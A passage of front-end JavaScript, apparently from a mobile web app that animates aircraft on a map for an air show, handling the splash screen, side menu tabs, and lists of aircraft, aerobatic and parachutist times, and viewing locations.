                    // Stops the gif from running more than once. It probably won't help because loadApp stops ui functions
                    setTimeout(function() {
                        loadApp();
                    }, 1500);
                }
            });
        }, 2120);
     } else {
         $(".splash").fadeOut();
         showIncompatibleDevicePopup();
     }
}

function loadApp() {
    loadMapApi();
    showComponents();
    setTimeout(removeAircraftsFromLocation,1000);
}

function loadMapApi() {
    if (!mapLoaded) {
        $.getScript(MAP_URL, function() {
            mapLoaded=true;
            }
        );
    }
}

function showComponents() {
    $(".map-dark").show();
    $(".splash").css('visibility', 'visible');
}
function compatibleDevice() {
    return ((/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase())));
}

function checkIframe() {
    return (top !== self);
}

var defer = $.Deferred();

var isMenuOpen = false;
var canOpenMenu = true;
var currTab = "#tab2";
var $menuHamburger;

function openListView() {
    if (aboutVisible) {
        $("#aboutPopup").fadeOut();
        $("#aboutMenuTitle").fadeOut("fast", function () {
            $("#headerIcon").fadeIn();
        });
        $("#aboutButton").attr("src", "icons/aboutIcon.png");
        aboutVisible = false;
        $menuHamburger.toggleClass("is-active");
    } else if (canOpenMenu) {
        canOpenMenu = false;
        if (isMenuOpen) {
            $menuHamburger.toggleClass("is-active");
            closeMenu();
        } else {
            $menuHamburger.toggleClass("is-active");
            closeAllPopups();
            openMenu();
            fillMenu();
            if (mapLoaded) {
                closeEntrancePopup();
            }
        }
    }
}

function initMenu() {
    $menuHamburger = $("#menuHamburger");
    // ugly code to place about logo correctly related to the half blue
    $("#aboutLogo").css("paddingTop", $(".halfBlue").height() - $(".aboutLogo").height() + 12 + "px");

    $("#listView").height("100%");
    var height = $("#listView").height();
    $("#listView").height(height - 64 + "px");
    $(".tabs").height(height - 64 - 52 + "px");

    // Responsible for opening the side menu
    $menuHamburger.on("click", openListView);

    // Responsible for managing the tabs
    $(".menuLink").on("click", function(elem) {
        $(".menuLink").removeClass("active");
        $(elem.target).addClass("active");
        var currentAttrValue = $(this).attr('href');
        if (currTab != currentAttrValue) {
            $("hr").toggleClass("two")
        }
        currTab = currentAttrValue;
        $('.tabs ' + currentAttrValue).show().siblings().hide();
    });

    $("#showScheduleButton").on("click", openListView);
    $("#showMapButton").on("click", closeEntrancePopup);
}

function openMenu() {
    $("#listView").css({"transform": "translateX(0)"});
    isMenuOpen = true;
    setTimeout(function() {
        canOpenMenu = true
    }, 300);
}

function closeMenu() {
    $("#listView").css({"transform": "translateX(100%)"});
    isMenuOpen = false;
    setTimeout(function() {
        canOpenMenu = true
    }, 300);

}

function loadCategories(callback) {
    $.getJSON("data/categories.json", function(pCategories) {
        categories = pCategories;
        callback();
    });
}

function createCategoryRow(category, isBlue) {
    return "<div class='aircraftCategory " + (isBlue ? "categoryBlue" : "") + "'>" + category.category + "</div>"
}

function fillMenu() {
    var html = "";
    var map  = new Map();

    // Creates a map that maps an aircraft's name (which is basically a group for all the aircraft's with the same name)
    // to it's object which is the first of its kind. For example, if we have four F15, the map will contain the first one only.
    aircrafts.forEach(function(aircraft) {
        // if (map.get(aircraft.name)) {
        //     if (convertTime(aircraft.path[0].time) < convertTime(map.get(aircraft.name).path[0].time)) {
        //         map.set(aircraft.name, aircraft);
        //     }
        // } else {
        //     map.set(aircraft.name, aircraft);
        // }
            map.set(aircraft.name, aircraft);
    });

    categories.forEach(function(category) {
       var categorizedAircrafts = [].concat(aircrafts);
       html += createCategoryRow(category,
           ((category.aerobatic) || (category.parachutist)) ? true : false);
       if (category.aerobatic) {
            var aerobaticLocations = [].concat.apply([], categorizedAircrafts.filter(aircraft => aircraft.aerobatic)
                    .map(aerobatics => aerobatics.path));
            var aerobaticAircrafts = categorizedAircrafts.filter(aircraft => aircraft.aerobatic);
            html+= createTableRow(aerobaticAircrafts[0].aircraftId, aerobaticAircrafts[0].name,aerobaticAircrafts[0].icon,aerobaticAircrafts[0].type,aerobaticAircrafts[0].time,false,false,true,false);
            aerobaticLocations.forEach(location => {
                    html += createAerobaticRow(locations[location.pointId].pointName,
                                               location.time);
                });
       } else if (category.parachutist) {
           var parachutistLocations = [].concat.apply([], categorizedAircrafts.filter(aircraft => aircraft.parachutist)
               .map(parachutist => parachutist.path));
           var parachutistAircrafts = categorizedAircrafts.filter(aircraft => aircraft.parachutist);
           html+= createTableRow(parachutistAircrafts[0].aircraftId, parachutistAircrafts[0].name,parachutistAircrafts[0].icon,parachutistAircrafts[0].type,parachutistAircrafts[0].time,false,false,true,false);

           parachutistLocations.forEach(location =>
                html += createParachutistRow(locations[location.pointId].pointName,
                                             location.time));
           }

       Array.from(map.values()).filter(aircraft =>
                aircraft.category === category.category)
           .sort((aircraft1, aircraft2) => {
               return aircraft1.path[0].time - aircraft2.path[0].time
           })
           .forEach(function (aircraftFromCategory) {
                html += createTableRow(aircraftFromCategory.aircraftId,
                                       aircraftFromCategory.name,
                                       aircraftFromCategory.icon,
                                       aircraftFromCategory.type,
                                       aircraftFromCategory.path[0].time,
                                       aircraftFromCategory.aerobatic,
                                       aircraftFromCategory.parachutist,
                                       true,
                                       false);

       });
    });
    $("#aircraftsListView").html(html);

    // prepare locations view
    var locationsViewHtml = "";

    // sort locations by name
    var sortedLocations = locations.slice();

    sortedLocations.sort(function (item1, item2) {
        var keyA = item1.pointName,
            keyB = item2.pointName;

        // Compare the 2 times
        if (keyA < keyB) return -1;
        if (keyA > keyB) return 1;
        return 0;
    });

    var currTime = getCurrentTime();

    sortedLocations.forEach(function(location) {
        if (!location.hidden) {
            locationsViewHtml += (currTime > actualStartTime) ? createLocationRow(location, true) : createLocationRow(location, false);
        }
    }, this);
    $("#locationsListView").html(locationsViewHtml);
}
function makeTwoDigitTime(t) {
    if (t<10){
        return "0"+t.toString();
    }
    else{
        return t.toString();
    }
}
function roundToMinute(time) {
    var hour=time.substr(0,2);
    var minute=time.substr(3,2);
    var second=time.substr(6,2);
    var h=parseInt(hour);
    var m=parseInt(minute);
    var s=parseInt(second);
    if (s>39){
        m=m+1;
        if (m>=60){
            h=h+1;
            m=m-60;
        }
    }
    return makeTwoDigitTime(h)+":"+makeTwoDigitTime(m);
}
function initMap() {
    loadPlugins();

    // register service worker (needed for the app to be suggested as wepapp)
    //registerServiceWorker();

    // make it larger than screen that when it scrolls it goes full screen
    makeHeaderSticky();
    initPopups();

    if (compatibleDevice() && !checkIframe()) {
        // let splash run for a second before start loading the map
        setTimeout(function () {
            map = createMapObject(function() {
                closeAllPopups();
            });
            $("#map").show();

            drawRoutesOnMap(routes);
            addAircraftsToMap();
            startAircraftsAnimation(false);
            //clusterAircrafts(aircraftMarkers);

            // hide splash screen
            setTimeout(function () {
                $(".splash").fadeOut();
//                 showCurrentLocation();
                loadSecurityScript();
            }, 3500);

            $(window).focus(function () {
//                 startAircraftsAnimation(true);
            });

            
            setTimeout(function () {
                if (!mapFail) {
                    $("#entrancePopup").addClass("mapLoaded");
                    $("#closeIcon").fadeIn();
                    $("#homeButton").css('visibility', 'visible');
                }
            }, 2000);
            
            
            defer.resolve(map);
        }, 1000);
     } else {
         setTimeout(function() {
             $(".splash").fadeOut();
             showIncompatibleDevicePopup();
         }, 1500);
     }
}

function closeEntrancePopup() {
    var ep = $("#entrancePopup");
    if (ep.css("display") !== "none") {
        ep.fadeOut();
        getMapUndark();
    }
}